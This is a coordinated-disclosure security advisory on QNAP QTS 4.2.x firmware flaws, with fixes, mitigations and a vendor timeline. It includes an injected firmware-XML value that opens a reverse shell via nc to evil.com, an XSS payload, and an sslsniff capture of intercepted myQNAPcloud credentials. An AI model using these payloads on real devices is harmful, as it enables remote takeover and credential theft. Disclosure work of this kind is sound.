@@ -1,0 +1,324 @@
+id: 27040
+date: 02/18/2017
+title: QNAP QTS 4.2.x multiple Vulnerabilities
+author: Harry Sintonen
+cves: 
+
+QNAP QTS 4.2.x multiple vulnerabilities
+=======================================
+The latest version of this advisory is available at:
+https://sintonen.fi/advisories/qnap-qts-42-multiple-vulnerabilities.txt
+
+
+Overview
+--------
+
+QNAP QTS firmware contain Missing Transport Layer Security (CWE-319),
+Improper Certificate Validation (CWE-295), Command Injection (CWE-77),
+Cross-Site Scripting (CWE-79) and Information Exposure (CWE-200)
+vulnerabilities that can be exploited to gain remote command execution
+to the devices or to perform arbitrary administrative functions, and
+to gain unauthorized access to user's myQNAPcloud credentials.
+
+
+Description
+-----------
+
+QNAP QTS software firmware update functionality include Missing Transport
+Layer Security (CWE-319), Command Injection (CWE-77) and Cross-Site
+Scripting (CWE-79) vulnerabilities. An attacker in a privileged network
+position can Man-in-The-Middle the firmware update check and exploit the
+command injection vulnerability to execute arbitrary commands on the
+targeted device.
+
+QNAP QTS myQNAPcloud functionality includes Improper Certificate Validation
+(CWE-295) vulnerability. The attacker in a privileged network position can
+exploit this vulnerability to eavesdrop the myQNAPcloud credentials.
+
+QNAP QTS media scraping functionality automatically scrapes Google and IMDB
+for media information (for example album cover images). The functionality
+contains an Information Exposure (CWE-200) vulnerability. The attacker in a
+privileged network position can eavesdrop the requests performed.
+
+
+Impact
+------
+
+The attacker in a privileged network position is able to execute arbitrary
+commands as administrative user (root). The attacker can also perform
+any administrative functions normally available to the administrator, such
+as firmware updates.
+
+The attacker in a privileged network position is able to gain access to
+the myQNAPcloud credentials. The attacker can access the NAS via the
+myQNAPcloud APIs and/or the www.myqnapcloud.com website.
+
+The attacker in a privileged network position is able gain knowledge of the
+media files stored on the device.
+
+
+Details
+-------
+
+The discovered vulnerabilities, described in more detail below, enable
+multiple independent attacks described here in brief:
+
+- Semi-Automated Remote Command Execution Via Firmware Update
+
+The vulnerabilities in QNAP QTS firmware update enable semi-automated
+remote command execution attacks against the QNAP firmware update
+functionality. The attack involves performing Man-in-The-Middle attack
+on the firmware update request. The exploit is triggered when the
+administrator logs on to the device, or when manual firmware update
+check is performed. The Cross-Site Scripting vulnerability enables
+attack automation, no other user interaction is needed.
+
+- Stealing myQNAPcloud Credentials and/or Access Tokens
+
+The Improper Certificate Validation in the myQNAPcloud requests enable
+Man-in-The-Middle attack against the myQNAPcloud connections. The
+attacker will learn the myQNAPcloud user credentials and/or access
+tokens. These in turn can be leveraged to obtain access to the NAS
+contents.
+
+- Media Information Exposure
+
+Missing Transport Layer Security and Improper Certificate Validation in
+the QTS media scraping functionality enable Man-in-The-Middle attack
+against the requests being performed. As a result, the attacker will
+gain knowledge about the media files stored on the device.
+
+
+Vulnerabilities
+---------------
+
+1. Firmware Update Missing Transport Layer Security (CWE-319)
+
+The QNAP QTS firmware release XML file is downloaded without transport
+layer security (TLS). The content of the file can be tampered with. The
+actual firmware updates are downloaded without transport layer security
+(TLS), too. The attacker in a privileged network position can
+Man-in-The-Middle the connection and tamper with the downloaded firmware
+release XML and/or the firmware binaries.
+
+NOTE: It is unclear if the firmware binaries are somehow signed. If no
+signing is used, the firmware image can be replaced with any custom
+content by the attacker.
+
+
+2. myQNAPcloud Improper Certificate Validation (CWE-295)
+
+The QNAP QTS connects to myQNAPcloud without proper certificate
+validation. The attacker in a privileged network position can
+Man-in-The-Middle the connection and steal the user credentials and/or
+access tokens and other confidential information.
+
+At least the following hosts are contacted without validation:
+- account.myqnapcloud.com
+- core2.api.myqnapcloud.com
+- auth.api.myqnapcloud.com
+
+The myQNAPclould service also connects back to the NAS. Even if this
+connection is configured to use TLS only, again no certificate
+validation is performed.
+
+myQNAPcloud credential capture example:
+
+# sslsniff -a -c /usr/share/sslsniff/certs/wildcard -s 4443 -w /dev/stdout
+1485661482 INFO sslsniff : Added OCSP URL: ocsp.ipsca.com
+1485661482 INFO sslsniff : Certificate Ready: *
+sslsniff 0.8 by Moxie Marlinspike running...
+1485661488 DEBUG sslsniff : Read from Client (api.myqnapcloud.com) :
+POST /oauth/token HTTP/1.1
+Host: auth.api.myqnapcloud.com
+Accept: application/json
+X-QNAP-APP-ID: 0vi23432423egfdsscwklkjdw23s9001
+X-QNAP-SUBAPP-ID: 0vi23432423egfdsscwklkjdw23s9001
+X-QNAP-MODEL: TVS-663
+X-QNAP-FIRMWARE: 4.2.3_20170121
+X-QNAP-DIGEST: 20[XXXXXXXXXXXXXXXXXXXXXXXXXX]0e
+X-QNAP-APP-VER: 2.0.11
+X-QNAP-DEVICE-HOSTNAME: NASSE
+Content-Length: 191
+Content-Type: application/x-www-form-urlencoded
+
+grant_type=password&client_id=0vi23432423egfdsscwklkjdw23s9001&
+client_secret=dlxkajKmomLqdBmvNfjVycvHjXjikeowUFYOPf43s&
+username=email%40victim.com&password=mysecretpassword
+
+
+3. Command Injection in Firmware Update (CWE-77)
+
+/sbin/get_new_firmware binary has a command injection bug. The following
+command is executed via popen():
+
+/bin/ping -c 2 %s > /tmp/ping_reply ; /bin/cat /tmp/ping_reply |
+/bin/grep time | /bin/cut -d '=' -f 4 | /bin/cut -d ' ' -f 1 ;
+/bin/rm -f /tmp/ping_reply
+
+The value inserted to %s is obtained from the 'server' element of the
+downloaded firmware update XML file:
+
+<?xml version="1.0" encoding="utf-8"?>
+<docRoot>
+<storage>
+<downloadServer>
+<server>http://download.qnap.com/</server>
+<server>http://eu1.qnap.com/</server>
+<server>http://us1.qnap.com/</server>
+</downloadServer>
+
+By modifying the server parameter, arbitrary commands can be executed. For
+example:
+
+<server>http://`nc -e`echo -e '\x2fbin\x2fsh'` evil.com 9999`</server>
+
+Note that the string used in the ping command argument is terminated by a
+slash (/) character, so the injected command cannot include it. This
+limitation is trivial to bypass by encoding the character.
+
+
+4. Cross-Site Scripting Via Firmware Update (CWE-79)
+
+There are several Cross-Site Scripting vulnerabilities in the QNAP web user
+interface.
+
+When the QNAP web user interface notices a new firmware update it will pop
+up a requester indicating that a new firmware update is available. The
+"build number" is part of this message. Also the Event Notification for a
+new firmware update will render the "build number" in a similar manner.
+
+The displayed information is extracted from the downloaded firmware update
+XML file. For example:
+
+<buildNumber>20160119</buildNumber>
+
+The information displayed isn't encoded properly, leading to a Cross-Site
+Scripting vulnerabilty. For example:
+
+<buildNumber><img src=x onerror=alert(1)></img></buildNumber>
+
+These cross site scripting vulnerabilities can be leveraged to perform
+arbitrary administrative operations available to the logged in user.
+
+
+5. Information Exposure To 3rd Parties Via Media Scraping (CWE-200)
+
+The QNAP QTS 'media' scraping functionality connects to
+ajax.googleapis.com without proper certificate validation, and to
+www.imdb.com and akas.imdb.com without transport layer security. An
+attacker in a privileged network position can Man-in-The-Middle the
+connections and learn the titles of the media files stored on the NAS.
+
+The /mnt/ext/opt/medialibrary/lib/libscrap.so library performs insecure
+TLS connections by enabling insecure mode (-k):
+
+# strings libscrap.so | grep 'curl -k'
+/sbin/curl -k -L '%s' --connect-timeout 30 --
+
+The library also performs insecure connections to various sites without
+transport layer security:
+
+# grep -oa 'http://[^/]*' libscrap.so
+http://www.imdb.com
+http://www.imdb.com
+http://akas.imdb.com
+http://akas.imdb.com
+http://akas.imdb.com%s
+
+
+Vulnerable devices
+------------------
+
+The vulnerabilities were discovered from an QNAP TVS-663, firmware version
+4.2.0 Build 20160119. They're also confirmed to work with version 4.2.2
+Build 20161214.
+
+According to QNAP the vulnerabilities affect all QNAP products running QTS.
+
+
+Recommendations to vendor
+-------------------------
+
+1. In custom openssl code validate the certificate chain by utilizing
+SSL_CTX_set_verify with mode SSL_VERIFY_PEER. Create a verify_callback
+hook that validates the certificate Common Name (CN) or Subject
+Alternative Names (SAN) against the intended target host name. In
+libcurl code do not disable CURLOPT_SSL_VERIFYPEER. Do not use -k/
+--insecure option with curl command. Do not use --no-check-certificate
+with wget.
+
+2. Do not utilize internet APIs without transport layer security. Upgrade
+all internal QNAP APIs to use TLS. The old non-TLS QNAP APIs can remain
+functional to allow legacy QTS versions to access them.
+
+3. Fix the command injection vulnerability by performing proper input
+validation (whitelisting) and/or shell metacharacter escaping, or by
+utilizing execl family of functions.
+
+4. Fix the firmware update related Cross-Site Scripting vulnerabilities
+in the user interface by performing input validation and/or output
+HTML encoding.
+
+5. Stop using the deprecated API
+https://ajax.googleapis.com/ajax/services/search/images?v=1.0
+
+
+End user mitigation
+-------------------
+
+- Install the latest firmware update, version 4.2.3 build 20170213 or later.
+
+- If you're worried about Scraping privacy issues use external
+firewall to block the QNAP device from accessing the following
+external sites:
+ajax.googleapis.com
+www.imdb.com
+akas.imdb.com
+
+
+Credits
+-------
+
+The vulnerabilities were discovered by Harry Sintonen / F-Secure Oyj.
+
+
+Timeline
+--------
+
+30.01.2016 discovered vulnerabilities 1, 3 and 4
+31.01.2016 discovered vulnerabilities 2 and 5
+31.01.2016 wrote a proof of concept exploit
+01.02.2016 sent an advance notice to vendor regarding the vulnerabilities
+01.02.2016 started to write a preliminary advisory
+01.02.2016 sent the preliminary advisory to vendor
+02.02.2016 sent the preliminary vulnerability report to CERT-FI
+08.03.2016 sent a status inqury to vendor
+14.03.2016 received a response from vendor about the status. agreed that
+disclosure should be coordinated. vendor representative agreed
+to contact me shortly regarding the fixes. communicated the
+deadline of 180 days from delivery of the initial advisory.
+31.07.2016 no communication from vendor has occurred. sent advance notice
+to vendor regarding the planned disclosure date of 01.08.2016.
+02.08.2016 vendor asked for 90 day extension. agreed to it.
+02.11.2016 no fixes or updates arrived after 90 days.
+21.11.2016 no word from vendor. asked if vendor needs even more time.
+reminded vendor that: "...the whole point of responsible
+disclosure is that vulnerabilities get fixed. Extended delay
+allows for other malicious parties to also find the vuls and
+exploit them."
+24.11.2016 vendor requested yet another postponement. no schedule was
+given.
+05.12.2016 informed the vendor of disclosure at Disobey 2017 on Jan 13th.
+13.01.2017 dislosed vulnerabilities 1, 3 and 4 at Disobey 2017.
+18.01.2017 vendor confirmed that all devices running QTS are vulnerable.
+28.01.2017 vendor released QTS 4.2.3 and notified the author.
+29.01.2017 QTS 4.2.3 fixed at least vulnerability 1. this is enough
+to block the firmware exploit. vulnerability 2 was confirmed
+to be unfixed. reported the status to the vendor. vendor
+requested until 15.02.2017 to fix vulnerability 2.
+14.02.2017 vendor released QTS 4.2.3 Build 20170213 fixing vulnerability
+2.
+15.02.2017 public release of the advisory.
+
+#  0day.today [2023-03-23]  #
